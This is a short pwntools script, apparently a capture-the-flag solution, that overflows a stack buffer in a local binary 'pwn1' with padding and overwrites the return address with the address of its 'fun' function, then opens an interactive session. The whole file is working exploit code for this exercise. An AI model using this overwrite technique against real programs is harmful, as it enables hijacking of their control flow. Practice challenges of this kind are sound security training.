from pwn import *

context.log_level = 'DEBUG'

p = process('./pwn1')
elf = ELF('./pwn1')

payload = 'a'*(0xf+8) + p64(elf.symbols['fun'])

p.send(payload)

p.interactive()